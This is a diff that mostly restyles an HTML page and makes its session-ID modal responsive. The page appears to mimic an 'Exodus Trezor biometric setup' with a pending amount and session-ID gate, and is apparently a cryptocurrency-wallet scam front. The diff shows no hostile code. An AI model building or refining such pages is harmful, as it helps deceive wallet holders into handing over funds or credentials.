@@ -94,22 +94,35 @@
     .pending-status{color:#a855f7;font-weight:800;letter-spacing:1px;}
     .pending-amount{color:var(--accent);font-weight:900;font-size:28px;}
 
-    /* Session modal */
-    .session-modal{width:520px;max-width:94%;padding:22px;border-radius:12px;text-align:center;}
-    .session-input{width:100%;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.06);background:rgba(255,255,255,0.02);color:#eaf2ff;font-weight:800;margin-top:12px;font-family:inherit;font-size:15px;}
-    .hint{color:var(--muted);margin-top:8px;font-size:13px;}
-    .error{color:var(--danger);margin-top:10px;font-weight:800;}
-    .success{color:var(--success);margin-top:10px;font-weight:800;}
+    /* Session modal specifics (smaller & responsive) */
+    .session-modal{width:min(92%,520px);max-width:92%;padding:18px;border-radius:12px;text-align:center;}
+    .session-modal .modal-title{font-size:18px}
+    .session-input{width:100%;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.06);background:rgba(255,255,255,0.02);color:#eaf2ff;font-weight:800;margin-top:12px;font-family:inherit;font-size:clamp(13px,2.2vw,15px);box-sizing:border-box;}
+    .session-actions{display:flex;gap:8px;margin-top:12px;justify-content:center;flex-wrap:wrap;}
+    .session-actions .btn{padding:10px 12px;font-size:14px;min-width:120px;}
 
-    /* Responsive */
-    @media (max-width:980px){
+    .hint{color:var(--muted);margin-top:8px;font-size:clamp(11px,2vw,13px);}
+    .error{color:var(--danger);margin-top:10px;font-weight:800;font-size:clamp(12px,1.8vw,14px);}
+    .success{color:var(--success);margin-top:10px;font-weight:800;font-size:clamp(12px,1.8vw,14px);}
+
+    /* Small screen adjustments (reduce paddings & fonts) */
+    @media (max-width:640px){
+      .container{padding:18px;}
+      .card{padding:18px;border-radius:12px;}
+      .modal{padding:14px;border-radius:12px;}
       .modal-body{grid-template-columns:1fr;}
-      .modal-right{order:2;}
-      .wallet-option{padding:8px;}
-      .device-preview{height:160px;}
+      .modal-right{order:2;padding:10px;}
+      .device-preview{height:140px;}
+      .page-title{font-size:22px;}
+      .amount{font-size:36px;}
+      .btn-primary{min-width:160px;padding:10px 14px;}
     }
-    @media (max-width:520px){
-      .amount{font-size:38px;}
+    @media (max-width:420px){
+      .session-modal{padding:12px;}
+      .session-input{font-size:13px;padding:10px;}
+      .session-actions .btn{min-width:110px;padding:8px 10px;font-size:13px;}
+      .modal-right{padding:8px;}
+      .wallet-option{padding:8px;}
     }
   </style>
 </head>
@@ -155,15 +168,21 @@
     </section>
   </main>
 
-  <!-- Session modal -->
+  <!-- Session modal (adjusted to avoid overflow) -->
   <div class="overlay show" id="sessionOverlay" aria-hidden="false">
     <div class="modal session-modal" role="dialog" aria-modal="true" aria-labelledby="sessionTitle">
-      <div><div id="sessionTitle" style="font-weight:900;font-size:20px;">Session ID Required</div><div class="hint">Enter Session ID to Access</div></div>
-      <input id="sessionInput" class="session-input" placeholder="******" aria-label="Session ID" autofocus />
-      <div style="display:flex;gap:10px;margin-top:12px;justify-content:center;">
+      <div>
+        <div id="sessionTitle" class="modal-title" style="font-weight:900;font-size:18px;">Session ID Required</div>
+        <div class="hint">Enter Session ID to Access</div>
+      </div>
+
+      <input id="sessionInput" class="session-input" placeholder="STAN-TXN-847392" aria-label="Session ID" autofocus />
+
+      <div class="session-actions">
         <button id="sessionSubmit" class="btn btn-primary">Unlock</button>
         <button id="sessionCancel" class="btn btn-ghost">Cancel</button>
       </div>
+
       <div id="sessionMsg" class="hint" style="margin-top:10px;">This is required before accessing the Exodus Trezor biometric setup.</div>
       <div id="sessionError" class="error" style="display:none;"></div>
       <div id="sessionSuccess" class="success" style="display:none;"></div>
@@ -209,12 +228,10 @@
           <div style="margin-top:14px;">
             <div class="small">Trezor image (provided):</div>
             <div class="device-preview" id="uploadPreview" style="margin-top:8px;">
-              <!-- replace IMAGE_DATA_URL with the base64 data URL or a local filename -->
+              <!-- keep your local filename or a data URL -->
               <img id="deviceImage" src="IMG_0142.jpeg" alt="Exodus + Trezor" />
             </div>
-            <div class="small" style="margin-top:8px;color:var(--muted)">
-              
-            </div>
+            <div class="small" style="margin-top:8px;color:var(--muted)">Provided device image used for visual confirmation.</div>
           </div>
         </div>
 
@@ -580,10 +597,8 @@
       }
     });
 
-    // show small notify box after unlock or when modal open
-    setTimeout(()=> {
-      /* visually show notify only when session unlocked; this placeholder prevents syntax errors */
-    }, 600);
+    // small placeholder timeout (no-op)
+    setTimeout(()=> {}, 600);
   </script>
 </body>
 </html>
